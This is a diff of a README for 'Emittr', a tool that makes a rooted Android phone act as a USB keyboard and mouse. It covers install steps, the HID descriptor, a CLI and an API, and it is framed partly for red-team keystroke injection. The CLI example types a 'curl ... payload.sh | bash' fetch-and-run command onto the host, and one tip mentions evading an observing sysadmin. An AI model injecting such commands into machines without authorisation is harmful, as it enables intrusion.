@@ -1,259 +1,337 @@
-# Emittr — Tactical USB HID Controller ⌨️ 🖱️
-
-> **Transform rooted Android devices and NetHunter phones into a tactical, crash-resilient USB HID Keyboard, Precision Touchpad, and Dual Xbox Joystick Scroll Deck with a high-performance Material Design 3 Web App.**
-
-[![Release](https://img.shields.io/badge/release-v1.3.0-blue.svg)](https://github.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-teal.svg)](https://fastapi.tiangolo.com/)
-[![Platform](https://img.shields.io/badge/platform-Android%20%7C%20NetHunter%20%7C%20Linux-orange.svg)](#requirements)
-
-Emittr turns an Android device (running Kali NetHunter or any Linux chroot with kernel USB gadget configfs) into a hardware-emulated USB Human Interface Device (HID). It operates concurrently as a standard 104-key USB Keyboard and an ergonomic USB Mouse with native multi-axis scrolling (Vertical Wheel + AC Pan Horizontal Scroll), plug-and-play compatible with Windows, macOS, Linux, and gaming consoles.
-
----
-
-## 📑 Table of Contents
-
-- [Overview](#-overview)
-- [Key Features](#-key-features)
-- [How It Works & Architecture](#-how-it-works--architecture)
-- [Hardware & Kernel Requirements](#-hardware--kernel-requirements)
-- [Installation & Quick Start](#-installation--quick-start)
-- [NetHunter Mass-Storage Prevention & USB Watchdog](#-nethunter-mass-storage-prevention--usb-watchdog)
-- [Modifier Key Safety & Emergency Unstick](#-modifier-key-safety--emergency-unstick)
-- [Xbox Joysticks & Native Scrolling Mechanics](#-xbox-joysticks--native-scrolling-mechanics)
-- [Universal Dashboard Mode](#-universal-dashboard-mode)
-- [REST API & WebSocket Protocol](#-rest-api--websocket-protocol)
-- [CLI Tool (`usbtype`)](#-cli-tool-usbtype)
-- [Troubleshooting & FAQ](#-troubleshooting--faq)
-- [License](#-license)
-
----
-
-## 🌟 Overview
-
-Whether you are performing tactical red-team keystroke injection, managing a headless server from your phone, typing long texts and code snippets onto a locked-down workstation, or simply using your phone as an emergency keyboard and trackpad, Emittr provides a seamless, lag-free bridge over standard USB OTG.
-
-Unlike Bluetooth or Wi-Fi remote-input apps, Emittr presents itself as a **genuine USB hardware device** at the physical bus level. No host software, drivers, or agent installations are needed on the target PC.
-
----
-
-## ✨ Key Features
-
-### 1. ⌨️ Live Keyboard Mirroring
-- **Universal Input Engine**: Type with SwiftKey, Gboard, Samsung Keyboard, or voice-to-text. Keystrokes are diffed and sent over a sub-5ms low-latency WebSocket connection.
-- **Hardware Helper Keys**: Dedicated tap targets for `Backspace ⌫`, `Tab ⇥`, `Enter ↵`, `Escape`, and arrow keys (`▲`, `◀`, `▼`, `▶`).
-- **Collapsible Strokes Feed**: A sleek, non-distracting key history feed that can be toggled on demand.
-
-### 2. 📝 Bulk Text Typer
-- **Customizable Speed Engine**: Preset typing speeds (*Instant* 5ms, *Fast* 15ms, *Normal* 35ms, *Human* 60ms) plus a granular 1–150ms per-character slider.
-- **Pre-Flight Countdown**: Optional 1 to 5 second timer allowing you to switch to the target window on the PC before typing begins.
-- **Real-time Progress & Emergency Stop**: Visual progress bar with instant abort functionality.
-
-### 3. 🖱️ Precision Trackpad & Touchpad Gestures
-- **Smooth Cursor Gliding**: Single-finger touch glide scaled with configurable mouse sensitivity (0.5× – 2.0×).
-- **Two-Finger Multi-Touch Scrolling**: Natural touchpad scrolling in both directions:
-  - Slide two fingers up/down for vertical scrolling.
-  - Slide two fingers left/right for horizontal scrolling.
-- **Tap-to-Click**: Sub-220ms gesture recognition for instantaneous left click.
-- **Mouse Buttons**: Dedicated *Left*, *Middle*, and *Right* click buttons.
-
-### 4. 🎮 Dual Xbox Joysticks Dock (Side-by-Side)
-- **Ergonomic Footprint**: Replaces bulky long scroll bars with two compact, side-by-side **Xbox thumbsticks**:
-  - **Left Joystick (V-Axis)**: Push up / down for vertical scrolling.
-  - **Right Joystick (H-Axis)**: Push left / right for horizontal scrolling.
-- **Authentic Xbox Physics**:
-  - Concave thumbstick cap with textured grip rim, crosshair notches, and center illuminated pip.
-  - Rate-based continuous scrolling: tilting further increases scroll speed smoothly.
-  - Bouncy spring-back animation to center when released.
-  - Native USB HID **AC Pan** (Consumer Usage 0x0238) emitting true hardware `WM_MOUSEHWHEEL` events in Windows without key modifier hacks.
-
-### 5. 🚀 Tactical Hotkeys Deck
-- **Windows hotkeys**: `Win+R` (Run), `Ctrl+Shift+Esc` (Task Manager), `Win+L` (Lock), `Win+D` (Desktop), `Win+E` (Explorer), `Alt+Tab`, `Alt+F4`, `Ctrl+C`, `Ctrl+V`, `Ctrl+A`, `Ctrl+Z`.
-- **Directional cluster**: Standard physical arrow cross for navigation in BIOS, bootloaders, and text documents.
-
-### 6. 🚨 Emergency Modifier Unstick ("PC Poisoning" Prevention)
-- In USB HID devices, if a device disconnects while a modifier (like `Ctrl` or `Shift`) is active, the host OS keeps the key depressed in driver memory.
-- Emittr features an instant **"Unstick Keys"** header button and automatic startup/reconnect flush that injects a clean null report to release all stuck keys immediately.
-
-### 7. 🖥️ Universal Dashboard Mode
-- Accessible via the top header button on **all devices** (mobile, tablet, desktop) and the bottom navigation bar.
-- **Mobile Phones (`< 900px`)**: Stacks all four panels (Typer, Touchpad, Shortcuts, Live Keys) into a single, scrollable deck so you never need to jump between tabs. Tapping any tab smoothly scrolls into view.
-- **Desktop Monitors (`≥ 900px`)**: Expands into a balanced dual-column command center:
-  - **Left Column**: Text Typer & Windows Shortcuts Deck.
-  - **Right Column**: Touchpad with Xbox Joysticks & Live Keys Mirror.
-
----
-
-## 🏗️ How It Works & Architecture
+<div align="center">
 
 ```
-┌──────────────────────────────────────────────────────────┐
-│             Mobile Web Browser / PWA Client              │
-│  (Typer Textarea | Live SwiftKey Mirror | Trackpad Deck) │
-└──────────────────────────┬───────────────────┬───────────┘
-                │ REST API               │ WebSocket (/ws)
-                ▼                        ▼
-┌──────────────────────────────────────────────────────────┐
-│               FastAPI & Uvicorn Daemon                   │
-│         (Active USB Watchdog & Gadget Persist)           │
-└──────────────────────────┬───────────────────┬───────────┘
-                │ Report ID 1 (Kbd, 9B)  │ Report ID 2 (Mouse, 6B)
-                ▼                        ▼
-┌──────────────────────────────────────────────────────────┐
-│             /dev/hidg0 (Composite HID Gadget)            │
-│  Report ID 1: Keyboard (Boot 104-key)                    │
-│  Report ID 2: Mouse (5 Buttons + X + Y + Wheel + AC Pan) │
-└──────────────────────────┬───────────────────────────────┘
-                                │ USB Cable (OTG / UDC)
-                                ▼
-┌──────────────────────────────────────────────────────────┐
-│         Host Computer (Windows / macOS / Linux)          │
-│    Recognized natively as standard Keyboard & Mouse      │
-└──────────────────────────────────────────────────────────┘
+███████╗███╗   ███╗██╗████████╗████████╗██████╗ 
+██╔════╝████╗ ████║██║╚══██╔══╝╚══██╔══╝██╔══██╗
+█████╗  ██╔████╔██║██║   ██║      ██║   ██████╔╝
+██╔══╝  ██║╚██╔╝██║██║   ██║      ██║   ██╔══██╗
+███████╗██║ ╚═╝ ██║██║   ██║      ██║   ██║  ██║
+╚══════╝╚═╝     ╚═╝╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝
 ```
 
-1. **Linux Configfs Composite Gadget**:
-   - Emittr configures a single unified composite HID device on `functions/hid.0` mapping to `/dev/hidg0`.
-   - **Report ID 1**: 9-byte boot keyboard payload (Report ID + modifiers byte + reserved + 6 keycodes).
-   - **Report ID 2**: 6-byte mouse payload (Report ID + 5 button bits + 3 pad bits, relative X, relative Y, relative Wheel, relative AC Pan).
-2. **FastAPI Non-Blocking Controller**:
-   - Opens `/dev/hidg0` with `O_NONBLOCK` and `select.select(..., 0.05)` timeout protection to eliminate kernel deadlocks.
-3. **Loopback Port 80 Redirector**:
-   - An asynchronous userland TCP listener redirects incoming port 80 traffic to 8088 without using `iptables` NAT loopback rules.
+### *Tactical USB HID Deck • Ghost Keyboard • Dual Xbox Joysticks*
+**Turn any rooted Android or NetHunter phone into an unapologetic hardware-grade USB keyboard, precision trackpad, and continuous scrolling deck.**
+
+[![Release](https://img.shields.io/badge/Release-v1.3.0-00E5FF.svg?style=for-the-badge&logo=github)](https://github.com/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-F50057.svg?style=for-the-badge)](LICENSE)
+[![Gadget](https://img.shields.io/badge/USB_Gadget-Composite_HID-7C4DFF.svg?style=for-the-badge&logo=linux)](https://docs.kernel.org/usb/gadget_configfs.html)
+[![Web Deck](https://img.shields.io/badge/Deck-Material_3_PWA-00E676.svg?style=for-the-badge&logo=pwa)](http://localhost:8088)
+[![Zero-FOUC](https://img.shields.io/badge/Mobile-Zero--FOUC_Immune-FF9100.svg?style=for-the-badge)](#-zero-fouc--chrome-mobile-caching-defense)
+
+<br/>
+
+> *"Because typing a 64-character Wi-Fi password onto a locked-down workstation using your sweaty thumbs in 2026 is an insult to your dignity."*
+
+<br/>
+
+[🔥 Features](#-why-emittr-the-reality-check) • [🕹️ Xbox Joysticks](#-dual-xbox-thumbsticks--native-ac-pan-scrolling) • [⚡ Quick Start](#-quick-start-zero-to-hero-in-2-minutes) • [🛡️ PC Poisoning Fix](#-the-exorcism-guide-modifier-safety--pc-poisoning-cure) • [🛠️ Architecture](#-the-engine-room-architecture--descriptor-anatomy) • [💻 CLI (`usbtype`)](#-the-cli-arsenal-usbtype)
+
+</div>
 
 ---
 
-## 💻 Hardware & Kernel Requirements
+## 🧐 Why Emittr? (The Reality Check)
 
-- **Device**: Android phone with root access (Magisk recommended).
-- **Tested Hardware**: Honor 9 Lite (`LLD-AL10`, HiSilicon Kirin 659 / `hisi-usb-otg`), Nexus 5/6P, OnePlus devices.
-- **Kernel**: Linux kernel 3.18, 4.4, 4.9, 4.14, 4.19, or 5.x built with:
-  - `CONFIG_USB_CONFIGFS=y`
-  - `CONFIG_USB_CONFIGFS_F_HID=y`
-  - `CONFIG_USB_F_HID=y`
-- **Environment**: Kali NetHunter chroot or standalone Debian/Ubuntu rootfs.
-- **Python**: Python 3.8+ with `fastapi`, `uvicorn`, and `pydantic`.
+Ever tried controlling a PC with those sketchy Wi-Fi mouse apps from the Play Store? You install a random `.exe` server on your laptop, fight Windows Firewall, deal with 200ms lag, and pray it doesn’t leak your keystrokes to a random cloud server.
+
+Or maybe you tried a BadUSB rubber ducky, but it’s completely blind, fires once, and if your machine lags for half a second, the entire payload types into Notepad instead of PowerShell.
+
+**Emittr does things the right way:** it uses your phone's USB-OTG port and kernel `configfs` to disguise your phone as a **genuine, physical Dell USB Keyboard & Mouse**.
+
+| Feature | Shady Wi-Fi / Bluetooth Apps | BadUSB USB Sticks | Emittr v1.3.0 ⚡ |
+|---|---|---|---|
+| **Host PC Setup** | Needs client `.exe` / drivers | None (blind flash drive) | **Zero host install.** Works on BIOS, Windows, Mac, Linux, PS5. |
+| **Network Dependency** | Needs shared Wi-Fi / pairing | None | **Pure physical USB cable.** Air-gapped workstations rejoice. |
+| **Interactive Control** | Laggy & unreliable | ❌ Impossible (read-only script) | **Real-time typing, live touchpad, shortcuts & joysticks.** |
+| **Scrolling Engine** | Clunky fake wheel ticks | ❌ None | **Dual Xbox Joysticks** with native hardware AC Pan horizontal scroll. |
+| **The "Stuck Ctrl" Curse** | ☠️ Host PC poisoned forever | ☠️ Prone to descriptor race | **Instant zero-flush panic button + automatic reconnect flush.** |
+| **Android Memory Loss** | N/A | N/A | **Active kernel watchdog** prevents Android from reverting to MTP. |
+| **UI Aesthetics** | Looks like 2011 Gingerbread | None | **Sleek dark Material Design 3 cyberdeck with zero-FOUC.** |
 
 ---
 
-## 📦 Installation & Quick Start
+## ⚡ What's in the Arsenal?
 
-### 1. Clone & Transfer to Device
+### 1. 🚀 Bulk Text Typer (The 1,000 WPM Typist)
+Paste long shell scripts, base64 blobs, license keys, or multi-paragraph texts from your phone. Hit **Type** and watch your phone fire them across the USB cable faster than humanly possible.
+* **Granular Speed Slider**: Set speeds from *Instant* (5ms per key) to *Human* (60ms per key) if your target machine has an overzealous input buffer or an observant sysadmin looking over your shoulder.
+* **Pre-Flight Countdown**: 1 to 5 second delay giving you time to click into the right input box or terminal window before the keystroke storm begins.
+* **Progress Bar & Abort Button**: Visual progress with an instant kill switch.
+
+### 2. 📱 Live Keyboard Mirror (Brain-to-Wire)
+Type using whatever virtual keyboard you love on your phone — **SwiftKey, Gboard, Samsung Keyboard, or Voice-to-Text**.
+* Keystrokes are diffed and streamed over a sub-5ms WebSocket connection straight into the USB HID pipe.
+* Dedicated **Hardware Helper Buttons** for keys mobile keyboards never give you: <kbd>Tab ⇥</kbd>, <kbd>Esc</kbd>, <kbd>Backspace ⌫</kbd>, and a 4-way physical arrow pad (<kbd>▲</kbd> <kbd>◀</kbd> <kbd>▼</kbd> <kbd>▶</kbd>) to navigate BIOS menus, grub bootloaders, and terminal CLI menus.
+* **Collapsible Strokes Feed**: A sleek telemetry feed showing keystroke history that tucks neatly out of sight when you want zero distractions.
+
+### 3. 🖱️ Precision Trackpad & Gestures
+Turn your phone's glass into a high-precision, low-latency laptop touchpad.
+* **Fluid Glide**: Sub-millisecond cursor tracking calibrated to your phone's touch digitizer.
+* **Two-Finger Multi-Touch Scrolling**: Slide two fingers up/down for vertical scroll, or left/right for smooth horizontal panning.
+* **Tap-to-Click**: Intuitive sub-220ms gesture recognition for instantaneous left click.
+* **Tactile Mouse Buttons**: Dedicated <kbd>Left</kbd>, <kbd>Middle</kbd>, and <kbd>Right</kbd> click pads with distinct haptic feedback.
+* **Sensitivity Slider**: Dial your cursor speed anywhere from `0.5×` (sniper mode) to `2.0×` (dual-4K monitor zoom).
+
+### 4. 🕹️ Dual Xbox Thumbsticks & Native AC Pan Scrolling
+*Because scrolling through 10,000 rows in Excel or massive codebases on a touchscreen shouldn't feel like dragging an anchor.*
+
+Emittr embeds two authentic **Xbox-style thumbstick caps** side-by-side:
+* **Left Stick (Vertical Scroll)**: Deflect Up to scroll up, deflect Down to scroll down.
+* **Right Stick (Horizontal Scroll)**: Deflect Left to scroll left, deflect Right to scroll right.
+* **Continuous Rate Physics**: The harder you push the stick, the faster the stream of scroll ticks. Release your thumb, and it snaps back to center with crisp CSS springs, instantly halting the scroll.
+* **True Hardware AC Pan (Usage 0x0238)**: No tacky `Shift + Wheel` keyboard hacks. Emittr sends genuine USB HID AC Pan mouse reports. Windows natively dispatches `WM_MOUSEHWHEEL` events directly into VS Code, Chrome, Excel, and terminal emulators.
+
+```
+       Vertical Scroll                      Horizontal Scroll
+       ┌─────────────┐                       ┌─────────────┐
+       │     ▲       │                       │             │
+       │  ┌───────┐  │                       │  ┌───────┐  │
+       │  │ ( · ) │  │                       │◀ │ ( · ) │ ▶│
+       │  └───────┘  │                       │  └───────┘  │
+       │     ▼       │                       │             │
+       └─────────────┘                       └─────────────┘
+      Push Up / Down                         Push Left / Right
+    Rate-Based Continuous                 Native AC Pan (0x0238)
+```
+
+### 5. 🎛️ Universal Dashboard Mode
+Whether you’re on a 5.5-inch phone in portrait mode or an ultrawide desktop monitor, Dashboard Mode morphs to give you full control:
+* **On Mobile (`< 900px`)**: Unrolls all four decks (Typer, Touchpad, Shortcuts, Live Keys) into a unified, all-in-one scrollable deck. Tapping any tab in the bottom bar smoothly glides directly to that card.
+* **On Desktop (`≥ 900px`)**: Expands into a dual-column battle station. Typer and Windows Shortcuts on the left; Touchpad with Xbox Joysticks and Live Keys on the right.
+
+### 6. 🛡️ The "Unstick" Panic Button (PC Poisoning Cure)
+We’ve all been there: you unplug a USB keyboard or BadUSB device in the middle of a command, and the target PC's operating system thinks <kbd>Ctrl</kbd> or <kbd>Shift</kbd> is permanently held down. Every letter you type triggers a hotkey nightmare.
+* Emittr features an instant **"Unstick"** header button that sends an immediate barrage of zero-byte release reports across both the keyboard and mouse pipes.
+* Better yet: the daemon watches the hardware UDC state. When the cable is plugged in, it **automatically flushes release reports** before you can even touch the screen.
+
+---
+
+## 🚀 Quick Start: Zero to Hero in 2 Minutes
+
+### Prerequisites
+* A rooted Android phone (Kali NetHunter, Magisk, or any Linux chroot).
+* Kernel built with USB Gadget ConfigFS support (`CONFIG_USB_CONFIGFS=y`, `CONFIG_USB_CONFIGFS_F_HID=y`). *Almost all modern Android kernels (3.18, 4.4, 4.9, 4.14, 4.19, 5.x) have this built-in.*
+* A standard USB OTG cable or USB-C to USB-A data cable.
+
+### 1. Clone & Deploy
 ```bash
 git clone https://github.com/mranj/usb-typer.git
 cd usb-typer
 ```
 
-### 2. Run Standalone Installer on the Phone
-Inside your NetHunter chroot terminal as root:
+### 2. Run the Autonomous Installer
+From your NetHunter or rooted Android terminal as `root`:
 ```bash
 bash install.sh
 ```
-This automated script:
-1. Installs files to `/opt/usb_hid_deck/`.
-2. Symlinks the `usbtype` CLI tool to `/usr/local/bin/usbtype`.
-3. Disables Android's automatic USB mass-storage reset triggers.
-4. Initializes `/config/usb_gadget/g1` with the composite HID descriptor.
-5. Launches the background server daemon on port `8088`.
 
-### 3. Autostart via Magisk on Boot
-Copy `02-usb-deck.sh` into your Magisk service directory:
+**What the installer does automatically:**
+1. Installs all daemon and web assets to `/opt/usb_hid_deck/`.
+2. Symlinks the `usbtype` binary to `/usr/local/bin/usbtype`.
+3. Neuters Android's `sys.usb.config` mass-storage auto-reset triggers.
+4. Builds `/config/usb_gadget/g1` with our composite Report ID 1 (Keyboard) and Report ID 2 (AC Pan Mouse) descriptor.
+5. Spawns the FastAPI server daemon on port `8088`.
+6. Sets up the port 80 loopback redirector so `http://hid.keyboard` works instantly.
+
+### 3. Make It Immortal Across Reboots (Magisk)
+Keep Emittr alive even after rebooting your phone by copying the boot script:
 ```bash
 cp /opt/usb_hid_deck/02-usb-deck.sh /data/adb/service.d/02-usb-deck.sh
 chmod +x /data/adb/service.d/02-usb-deck.sh
 ```
 
-### 4. Access the Web App
-Connect your phone to the target PC using a standard USB-C or Micro-USB OTG cable.
-- On your phone's browser: **`http://hid.keyboard`** or **`http://localhost:8088`**
-- From any device on your Wi-Fi: **`http://<phone-ip>:8088`**
-- Tap Chrome menu -> **"Add to Home Screen"** to install as a full-screen PWA.
+### 4. Plug In and Play!
+Plug the USB cable between your phone and the target computer.
+* **On your phone's browser**: Open `http://localhost:8088` or `http://hid.keyboard`.
+* **From your laptop/tablet on Wi-Fi**: Open `http://<phone-ip>:8088`.
+* **Tip**: In Chrome on Android, tap `⋮` -> **"Add to Home Screen"** to run Emittr as an edge-to-edge, full-screen native PWA!
 
 ---
 
-## 🛡️ NetHunter Mass-Storage Prevention & USB Watchdog
+## 🛡️ Zero-FOUC & Chrome Mobile Caching Defense
 
-### Why does NetHunter revert to mass storage?
-On Android devices, the Android framework daemon (`UsbDeviceManager`) listens for kernel USB disconnect events. When the USB cable is unplugged, Android's framework automatically resets `sys.usb.config` to `persist.sys.usb.config` (typically `mtp,mass_storage` or `hisuite`), which destroys the HID gadget symlinks in `/config/usb_gadget/g1/configs/b.1/`.
+Mobile Chrome is notorious for hoarding external stylesheets in flash memory and refusing to let go. In earlier iterations, updating the HTML would leave Chrome Mobile rendering an unstyled "HTML block" with raw text.
 
-### How Emittr solves it:
-1. **Property Suppression**:
-   `persist.sys.usb.config` and `sys.usb.config` are set to `none`.
-2. **Active Watchdog Loop**:
-   Every 1.5 seconds, `server.py` checks whether `/config/usb_gadget/g1/configs/b.1/f1` points to `functions/hid.0`. If Android ever hijacks the gadget, Emittr tears down the rogue links, rebinds `hid.0`, and restores `/dev/hidg0` instantly without requiring a phone reboot.
-
----
-
-## 🚨 Modifier Key Safety & Emergency Unstick
-
-### The "Stuck Ctrl" Problem
-When a USB keyboard is unplugged or disconnected from a PC while a modifier key (`Ctrl`, `Shift`, `Alt`, `Win`) is pressed, Windows keeps that key in the "down" state in its global keyboard driver state. The user is unable to type normally until a key-up report is received.
-
-### Emittr's Multi-Tier Protection:
-1. **`finally` Execution Guarantee**: Keystroke routines wrap the key-up report in Python `try ... finally` blocks to ensure releases are sent even if the host connection drops.
-2. **Plug-In Flush**: The moment the UDC detects a transition to `configured` (USB cable plugged into host), Emittr immediately flushes a 9-byte keyboard zero report and a 6-byte mouse zero report.
-3. **One-Tap Unstick Button**: The UI header features a dedicated **"Unstick Keys"** button that fires `/api/release`, releasing all modifiers and mouse buttons instantly.
+**Emittr v1.3.0 implements a bulletproof 4-layer defense:**
+1. **Critical CSS Inlined in `<head>`**: Core layout, responsive headers, button geometry, and the Xbox joysticks are embedded directly inside `<style id="emittr-critical-styles">`. The UI renders with 100% fidelity on the very first frame — zero Flash of Unstyled Content (FOUC).
+2. **Version Cache Busters**: Static assets are referenced with dynamic query hashes (`/static/style.css?v=1.3.0` and `/static/app.js?v=1.3.0`).
+3. **Aggressive Anti-Cache HTTP Middleware**: FastAPI sends strict `Cache-Control: no-cache, no-store, must-revalidate, max-age=0` headers on all HTML and asset responses.
+4. **Compact Mobile Header**: On screens $\le 520\text{px}$, button text collapses into sleek, circular $34\text{px}$ icon-only pills, leaving ample breathing room for the title and connection status without unsightly multi-line wrapping.
 
 ---
 
-## 🎮 Xbox Joysticks & Native Scrolling Mechanics
+## 🔬 The Engine Room: Architecture & Descriptor Anatomy
 
-### Dual Xbox Thumbsticks
-Instead of long, cumbersome scroll barrels, Emittr features two compact, side-by-side **Xbox-style thumbsticks**:
-- **Left Stick (Vertical Scroll)**: Deflecting up scrolls up; deflecting down scrolls down.
-- **Right Stick (Horizontal Scroll)**: Deflecting left scrolls left; deflecting right scrolls right.
-- **Rate-Based Physics**: The further you push the thumbstick from center, the faster it continuously scrolls.
-- **Spring-Back Action**: Releasing your thumb snaps the stick back to center with smooth spring physics and halts scrolling immediately.
+```
+┌──────────────────────────────────────────────────────────────┐
+│                 Mobile Browser / PWA Client                  │
+│       (Material Design 3 • Zero-FOUC • Dual Joysticks)        │
+└──────────────────────────────┬───────────────────────────────┘
+                               │ WebSocket (/ws) & REST (/api)
+                               ▼
+┌──────────────────────────────────────────────────────────────┐
+│               FastAPI Non-Blocking Controller                │
+│             (Active Watchdog • Auto-Flush Guard)             │
+└──────────────┬───────────────────────────────┬───────────────┘
+               │ Report ID 1 (9 Bytes)         │ Report ID 2 (6 Bytes)
+               ▼                               ▼
+┌──────────────────────────────────────────────────────────────┐
+│              /dev/hidg0 (Composite HID Gadget)               │
+│                                                              │
+│  [Report ID 1: Keyboard]                                     │
+│  Byte 0 : Report ID (0x01)                                   │
+│  Byte 1 : Modifiers (Ctrl, Shift, Alt, Win - 8 bits)         │
+│  Byte 2 : Reserved (0x00)                                    │
+│  Bytes 3-8 : Keycodes (6-Key Rollover array)                 │
+│                                                              │
+│  [Report ID 2: Mouse with AC Pan]                            │
+│  Byte 0 : Report ID (0x02)                                   │
+│  Byte 1 : Buttons (Bit 0: Left, Bit 1: Right, Bit 2: Middle)  │
+│  Byte 2 : Relative X movement (-127 to +127)                 │
+│  Byte 3 : Relative Y movement (-127 to +127)                 │
+│  Byte 4 : Vertical Wheel (-127 to +127)                      │
+│  Byte 5 : Horizontal AC Pan Wheel (-127 to +127)             │
+└──────────────────────────────┬───────────────────────────────┘
+                               │ Physical USB OTG Cable
+                               ▼
+┌──────────────────────────────────────────────────────────────┐
+│           Target Workstation (Win / Mac / Linux / PS5)        │
+│       Plug & Play Recognized as Standard Keyboard & Mouse    │
+└──────────────────────────────────────────────────────────────┘
+```
 
-### Native Hardware Horizontal Scrolling (AC Pan 0x0238)
-Unlike earlier hacks that attempted to simulate horizontal scrolling using `Shift + Wheel`, Emittr v1.3.0 implements the official USB HID **AC Pan (Application Control Pan, Usage 0x0238)** inside Report ID 2:
-- Windows natively receives `WM_MOUSEHWHEEL` events.
-- Works out of the box in Microsoft Excel, VS Code, Google Chrome, File Explorer, and code editors.
-- Zero desynchronization, no key races, and zero chance of stuck modifier keys.
+<details>
+<summary><b>🔍 Click to view the Raw HID Report Descriptor (Report ID 1 & 2)</b></summary>
+
+```c
+// Composite Keyboard (ID 1) + Mouse with AC Pan (ID 2)
+0x05, 0x01,        // Usage Page (Generic Desktop Ctrls)
+0x09, 0x06,        // Usage (Keyboard)
+0xA1, 0x01,        // Collection (Application)
+0x85, 0x01,        //   Report ID (1) - Keyboard
+0x05, 0x07,        //   Usage Page (Kbrd/Keypad)
+0x19, 0xE0,        //   Usage Minimum (0xE0 - LeftControl)
+0x29, 0xE7,        //   Usage Maximum (0xE7 - Right GUI)
+0x15, 0x00,        //   Logical Minimum (0)
+0x25, 0x01,        //   Logical Maximum (1)
+0x75, 0x01,        //   Report Size (1)
+0x95, 0x08,        //   Report Count (8)
+0x81, 0x02,        //   Input (Data,Var,Abs,NoWrap,Linear,PreferredState,NoNullPosition)
+0x95, 0x01,        //   Report Count (1)
+0x75, 0x08,        //   Report Size (8)
+0x81, 0x03,        //   Input (Const,Var,Abs,NoWrap,Linear,PreferredState,NoNullPosition)
+0x95, 0x06,        //   Report Count (6)
+0x75, 0x08,        //   Report Size (8)
+0x15, 0x00,        //   Logical Minimum (0)
+0x25, 0x65,        //   Logical Maximum (101)
+0x05, 0x07,        //   Usage Page (Kbrd/Keypad)
+0x19, 0x00,        //   Usage Minimum (0x00)
+0x29, 0x65,        //   Usage Maximum (0x65)
+0x81, 0x00,        //   Input (Data,Array,Abs,NoWrap,Linear,PreferredState,NoNullPosition)
+0xC0,              // End Collection
+
+0x05, 0x01,        // Usage Page (Generic Desktop Ctrls)
+0x09, 0x02,        // Usage (Mouse)
+0xA1, 0x01,        // Collection (Application)
+0x85, 0x02,        //   Report ID (2) - Mouse
+0x09, 0x01,        //   Usage (Pointer)
+0xA1, 0x00,        //   Collection (Physical)
+0x05, 0x09,        //     Usage Page (Button)
+0x19, 0x01,        //     Usage Minimum (0x01 - Button 1)
+0x29, 0x05,        //     Usage Maximum (0x05 - Button 5)
+0x15, 0x00,        //     Logical Minimum (0)
+0x25, 0x01,        //     Logical Maximum (1)
+0x75, 0x01,        //     Report Size (1)
+0x95, 0x05,        //     Report Count (5)
+0x81, 0x02,        //     Input (Data,Var,Abs)
+0x75, 0x03,        //     Report Size (3)
+0x95, 0x01,        //     Report Count (1)
+0x81, 0x03,        //     Input (Const,Var,Abs)
+0x05, 0x01,        //     Usage Page (Generic Desktop Ctrls)
+0x09, 0x30,        //     Usage (X)
+0x09, 0x31,        //     Usage (Y)
+0x09, 0x38,        //     Usage (Wheel)
+0x15, 0x81,        //     Logical Minimum (-127)
+0x25, 0x7F,        //     Logical Maximum (127)
+0x75, 0x08,        //     Report Size (8)
+0x95, 0x03,        //     Report Count (3)
+0x81, 0x06,        //     Input (Data,Var,Rel)
+0x05, 0x0C,        //     Usage Page (Consumer Devices)
+0x0A, 0x38, 0x02,  //     Usage (AC Pan - Horizontal Scroll)
+0x15, 0x81,        //     Logical Minimum (-127)
+0x25, 0x7F,        //     Logical Maximum (127)
+0x75, 0x08,        //     Report Size (8)
+0x95, 0x01,        //     Report Count (1)
+0x81, 0x06,        //     Input (Data,Var,Rel)
+0xC0,              //   End Collection
+0xC0               // End Collection
+```
+</details>
 
 ---
 
-## 🖥️ Universal Dashboard Mode
+## 💻 The CLI Arsenal: `usbtype`
 
-- **Mobile View (`< 900px`)**: In Dashboard Mode, all 4 sections (Typer, Touchpad, Shortcuts, Live Keys) are displayed in an all-in-one vertical deck. Clicking any tab in the bottom nav smoothly scrolls to that section without leaving Dashboard Mode.
-- **Desktop View (`≥ 900px`)**: Dashboard Mode displays an expansive two-column tactical command grid:
-  - **Left**: Typer + Windows Shortcuts Deck.
-  - **Right**: Touchpad & Xbox Joysticks + Live Keys Mirror.
-- **Persistent State**: Your Dashboard Mode preference is saved in `localStorage` and remembered on all screen sizes.
+Scripting a red-team injection or automated testing rig? Emittr ships with a standalone, blazing-fast command line interface:
+
+```bash
+# Check current gadget state and health
+usbtype --status
+
+# Fire a raw command onto the host machine
+usbtype "curl -sL https://example.com/payload.sh | bash"
+
+# Slow down typing speed (45ms per keystroke) for vintage terminals
+usbtype --delay 45 "dmesg | grep -i usb"
+
+# Inject hotkeys and system shortcuts
+usbtype --key win+r
+usbtype --key ctrl+alt+t
+usbtype --key ctrl+shift+esc
+
+# Release any stuck modifiers across the board
+usbtype --release
+```
+
+### Pro-Tip: The "Tactical Rickroll"
+```bash
+usbtype --key win+r
+sleep 0.5
+usbtype "https://youtu.be/dQw4w9WgXcQ"
+usbtype --key enter
+```
 
 ---
 
-## 🔌 REST API & WebSocket Protocol
+## 🔌 REST & WebSocket API Reference
 
-Emittr exposes an asynchronous REST and WebSocket API on port `8088`.
+Need to control Emittr from Python, Node.js, Bash, or Home Assistant? The entire engine is exposed over HTTP and WebSocket on port `8088`.
 
-### REST Endpoints
+### HTTP Endpoints
 
-| Method | Endpoint | Description | Sample Payload |
+| Method | Endpoint | Description | Example Payload |
 |---|---|---|---|
-| `GET` | `/api/status` | Current USB connection state, UDC details, and version | `None` |
-| `POST` | `/api/release` | Emergency unstick: release all modifiers and mouse buttons | `{}` |
-| `POST` | `/api/type` | Types a block of text onto the host PC | `{"text": "Hello World", "delay_ms": 15, "initial_delay_s": 0}` |
-| `POST` | `/api/stop` | Aborts active typing job | `{}` |
-| `POST` | `/api/key` | Injects a shortcut combo or special key | `{"combo": "win+r"}` or `{"key": "enter"}` |
-| `POST` | `/api/mouse` | Injects mouse movement, clicks, or scroll | `{"dx": 10, "dy": -5, "wheel": 2, "wheel_h": 0}` |
+| `GET` | `/api/status` | Current USB connection, UDC name, and version | *None* |
+| `POST` | `/api/release` | Emergency panic release (null flushes all keys/buttons) | `{}` |
+| `POST` | `/api/type` | Types a string with custom delays | `{"text": "ls -la", "delay_ms": 15, "initial_delay_s": 0}` |
+| `POST` | `/api/stop` | Halts any active bulk typing job immediately | `{}` |
